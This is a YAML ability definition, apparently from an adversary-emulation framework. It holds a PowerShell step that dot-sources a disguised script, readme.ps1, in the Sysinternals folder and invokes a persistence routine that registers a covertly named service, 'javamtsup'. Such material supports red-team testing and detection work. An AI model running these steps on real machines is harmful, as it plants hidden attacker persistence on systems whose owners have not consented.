- id: 9c75155e-21ab-4471-af16-45f3795a313c
  name: 5.A - Persistent Service - 1
  description: Leverage modified Sysinternals
  tactic: persistence
  technique:
    attack_id: T1023
    name: Shortcut Modification
  platforms:
    windows:
      psh, pshw:
        command: "Set-Location -path \"C:\\Program Files\\SysinternalsSuite\";\nif\
          \ (get-service -name \"javamtsup\" -ErrorAction SilentlyContinue) {\n  write-host\
          \ \"[*] Service already exists...Not running persistence step-1\";\n  exit\
          \ 1;\n}\n\nif (Test-Path -path \"readme.ps1\") {\n  . .\\readme.ps1;\n \
          \ Invoke-Persistence -PersistStep 1;\n  write-host \"[+] Persistence 1 invoked.\"\
          ;\n  exit 0;\n\n} else {\n  write-host \"[!] readme.ps1 not found.\";\n\
          \  exit 1;\n}\n"
